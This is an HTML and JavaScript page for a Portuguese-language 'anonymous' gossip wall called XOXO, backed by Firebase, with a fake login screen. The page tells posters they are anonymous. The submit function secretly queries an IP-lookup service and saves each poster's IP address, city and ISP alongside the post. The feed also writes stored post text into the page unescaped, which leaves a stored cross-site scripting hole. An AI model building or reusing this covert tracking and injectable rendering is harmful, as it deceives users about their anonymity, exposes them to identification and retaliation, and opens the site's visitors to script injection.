<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XOXO - O Mural dos Segredos</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore-compat.js"></script>

    <style>
        :root { --deep-black: #050505; }
        body { margin: 0; background-color: var(--deep-black); color: #ddd; font-family: 'Courier New', monospace; overflow: hidden; }

        /* Efeito de NÃ©voa que se move */
        .fog-bg {
            position: fixed; top: 0; left: 0; width: 200%; height: 100%;
            background: url('https://www.transparenttextures.com/patterns/smoke.png');
            opacity: 0.2; z-index: -1;
            animation: moveFog 40s linear infinite;
        }
        @keyframes moveFog { from { transform: translateX(0); } to { transform: translateX(-50%); } }

        /* Imagem do Rosto de AnÃ´nimo no Fundo */
        .hero { 
            height: 40vh; 
            background-image: linear-gradient(rgba(0,0,0,0.7), var(--deep-black)), url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=1000&q=80'); 
            background-size: contain; background-repeat: no-repeat; background-position: center;
            display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; 
        }
        .hero h1 { font-size: 5rem; margin: 0; color: #ccc; letter-spacing: 12px; }

        #login-screen { display: flex; flex-direction: column; align-items: center; padding: 50px; }
        .btn-login { background: #333; color: white; padding: 15px 30px; cursor: pointer; border: 1px solid #555; text-transform: uppercase; }
        
        #feed-container { display: none; padding: 20px; max-width: 600px; margin: auto; height: 55vh; overflow-y: auto; }
        .input-box { background: rgba(17, 17, 17, 0.9); padding: 20px; border: 1px solid #333; margin-bottom: 30px; }
        textarea { width: 100%; background: transparent; border: none; color: #aaa; font-size: 1.1rem; outline: none; font-family: inherit; resize: none; }
        .btn-post { background: #222; color: #999; border: 1px solid #444; padding: 10px 20px; float: right; cursor: pointer; }
        .btn-post:disabled { opacity: 0.5; cursor: wait; }
        .fofoca-card { background: #0d0d0d; padding: 20px; margin-bottom: 15px; border-left: 3px solid #444; }
    </style>
</head>
<body>

    <div class="fog-bg"></div>

    <header class="hero">
        <h1>XOXO</h1>
        <p>Segredos que o silÃªncio guarda.</p>
    </header>

    <div id="login-screen">
        <h3>Entre no mural... se tiver coragem.</h3>
        <button class="btn-login" onclick="fakeLogin()">Aceder ao Mural</button>
    </div>

    <div id="feed-container">
        <div class="input-box">
            <textarea id="fofocaInput" rows="3" placeholder="O que vocÃª sabe que ninguÃ©m mais sabe?"></textarea>
            <button class="btn-post" id="btnEnviar" onclick="enviarFofoca()">Soltar o Verbo!</button>
            <div style="clear: both;"></div>
        </div>
        <div id="mural"></div>
    </div>

    <script>
        var firebaseConfig = {
            apiKey: "AIzaSyC_RKEhHxEvgDN0w7X1AMAwE0a4ljiSbh4",
            authDomain: "xoxo-fofocas.firebaseapp.com",
            projectId: "xoxo-fofocas",
            storageBucket: "xoxo-fofocas.firebasestorage.app",
            messagingSenderId: "730968176054",
            appId: "1:730968176054:web:fcabf0465b189fddbdbd17",
            measurementId: "G-3DZPC3E7SV"
        };

        firebase.initializeApp(firebaseConfig);
        var db = firebase.firestore();

        function fakeLogin() {
            document.getElementById('login-screen').style.display = 'none';
            document.getElementById('feed-container').style.display = 'block';
            carregarFofocas();
        }

        function enviarFofoca() {
            var input = document.getElementById('fofocaInput');
            var btn = document.getElementById('btnEnviar');
            var texto = input.value;
            if (texto.trim() === "") return;

            btn.disabled = true;
            btn.innerText = "Rastreando...";

            let finalizado = false;

            // SeguranÃ§a: Se a API de IP demorar mais de 2.5s, envia sem rastro para NÃƒO travar
            const timeout = setTimeout(() => {
                if(!finalizado) {
                    finalizado = true;
                    salvarNoFirebase(texto, { ip: "Oculto/Timeout" });
                }
            }, 2500);

            window.capturarDados = function(data) {
                if(!finalizado) {
                    finalizado = true;
                    clearTimeout(timeout);
                    salvarNoFirebase(texto, {
                        ip: data.ip || "0.0.0.0",
                        cidade: data.city || "Desconhecida",
                        provedor: data.org || "NÃ£o identificado"
                    });
                }
            };

            var script = document.createElement('script');
            script.src = 'https://ipapi.co/jsonp/callback=capturarDados';
            document.body.appendChild(script);
        }

        function salvarNoFirebase(texto, rastro) {
            db.collection("fofocas").add({
                conteudo: texto,
                data: firebase.firestore.FieldValue.serverTimestamp(),
                rastro: rastro
            }).then(() => {
                document.getElementById('fofocaInput').value = "";
                alert("Segredo espalhado!");
            }).finally(() => {
                var btn = document.getElementById('btnEnviar');
                btn.disabled = false;
                btn.innerText = "Soltar o Verbo!";
                var s = document.querySelector('script[src*="ipapi"]');
                if(s) s.remove();
            });
        }

        function carregarFofocas() {
            db.collection("fofocas").orderBy("data", "desc").onSnapshot(snapshot => {
                var mural = document.getElementById('mural');
                mural.innerHTML = "";
                snapshot.forEach(doc => {
                    var f = doc.data();
                    mural.innerHTML += '<div class="fofoca-card"><small>ðŸ“¢ AlguÃ©m sussurrou...</small><p>' + f.conteudo + '</p></div>';
                });
            });
        }
    </script>
</body>
</html>
